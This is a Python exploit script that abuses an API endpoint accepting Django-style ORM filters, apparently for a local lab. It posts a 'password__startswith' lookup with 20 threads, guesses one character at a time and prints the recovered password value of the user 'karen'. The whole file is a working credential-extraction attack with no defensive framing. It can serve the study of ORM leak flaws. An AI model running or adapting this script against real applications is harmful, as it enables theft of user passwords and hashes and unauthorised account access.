import requests, string, sys
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://127.0.0.1:8000/api/user/?format=json"
CHARS = string.ascii_letters + string.digits + "$/=+_"
THREADS = 20

def worker(username: str, known_dumped: str, c: str) -> tuple[bool, str]:
    r = requests.post(
        TARGET,
        json={
            "username": username,
            "password__startswith": known_dumped + c
        }
    )
    r_json: dict = r.json()
    return len(r_json) > 0, known_dumped + c

def exploit(username: str):
    dumped_value = ""
    print(f"\r{Fore.GREEN}username: {Fore.BLUE}{Style.BRIGHT}{username}{Style.RESET_ALL}")
    print(f"\r{Fore.RED}password: {Fore.YELLOW}{Style.BRIGHT}{dumped_value}{Style.RESET_ALL}", end="")
    sys.stdout.flush()
    while True:
        found = False
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = executor.map(worker, [username]*len(CHARS), [dumped_value]*len(CHARS), CHARS)

            for result in futures:
                was_success = result[0]
                test_substring = result[1]
                print(f"\r{Fore.RED}password: {Fore.YELLOW}{Style.BRIGHT}{test_substring}{Style.RESET_ALL}", end="")
                sys.stdout.flush()
                if was_success:
                    found = True
                    dumped_value = test_substring
                    break

        if not found:
            break
    print(f"\r{Fore.RED}password: {Fore.YELLOW}{Style.BRIGHT}{dumped_value} {Style.RESET_ALL}")


def main():
    exploit("karen")

if __name__ == "__main__":
    main()
